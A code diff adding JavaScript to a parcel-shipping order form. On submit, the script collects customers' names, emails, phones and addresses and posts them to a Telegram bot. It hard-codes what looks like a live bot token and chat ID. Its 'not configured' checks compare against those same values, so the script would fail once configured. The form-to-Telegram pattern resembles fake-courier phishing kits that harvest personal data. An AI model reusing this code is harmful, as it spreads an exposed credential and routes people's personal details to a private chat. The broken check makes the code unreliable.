+    if (!BOT_TOKEN || BOT_TOKEN === "8892467602:AAEx3FoRPwOWy7S_NuUWRbCy8X_A9zJlVjk") {
+      showToast("Configure BOT_TOKEN in script", true);
+      return false;
+    }
+    if (!CHAT_ID || CHAT_ID === "1555129968") {
+      showToast("Configure CHAT_ID in script", true);
+      return false;
+    }
+    
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    const payload = {
+      chat_id: CHAT_ID,
+      text: message
+    };
+    
+    try {
+      const response = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      const result = await response.json();
+      return result.ok;
+    } catch (err) {
+      return false;
+    }
+  }
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const fullName = document.getElementById('fullName').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const address = document.getElementById('address').value.trim();
+    const receiverName = document.getElementById('receiverName').value.trim();
+    const deliveryAddress = document.getElementById('deliveryAddress').value.trim();
+    
+    if (!fullName || !email || !address || !receiverName || !deliveryAddress) {
+      showToast("Please fill all required fields", true);
+      return;
+    }
+    
+    if (!email.includes('@')) {
+      showToast("Enter a valid email", true);
+      return;
+    }
+    
+    let packageType = "Document/Envelope";
+    for (let r of packageRadios) {
+      if (r.checked) {
+        packageType = r.value;
+        break;
       }
     }
-  })();
+    
+    const orderData = {
+      fullName: fullName,
+      email: email,
+      phone: document.getElementById('phone').value,
+      address: address,
+      city: document.getElementById('city').value,
+      zip: document.getElementById('zip').value,
+      receiverName: receiverName,
+      deliveryAddress: deliveryAddress,
+      packageType: packageType,
+      weight: document.getElementById('weight').value,
+      service: document.getElementById('service').value,
+      notes: document.getElementById('notes').value,
+      signature: document.getElementById('signature').checked,
+      insurance: document.getElementById('insurance').checked,
+      total: calculateRate().toFixed(2)
+    };
+    
+    const message = buildMessage(orderData);
+    
+    const originalText = sendBtn.innerHTML;
+    sendBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Sending...';
+    sendBtn.disabled = true;
+    
+    const success = await sendToTelegram(message);
+    
+    sendBtn.innerHTML = originalText;
+    sendBtn.disabled = false;
+    
+    if (success) {
+      showToast("Order sent to Telegram!");
+      form.reset();
+      document.querySelector('input[name="packageType"][value="Document/Envelope"]').checked = true;
+      document.getElementById('weight').value = '2.5';
+      calculateRate();
+    } else {
+      showToast("Failed to send. Check bot token/chat ID", true);
+    }
+  });
 </script>
 </body>
 </html>
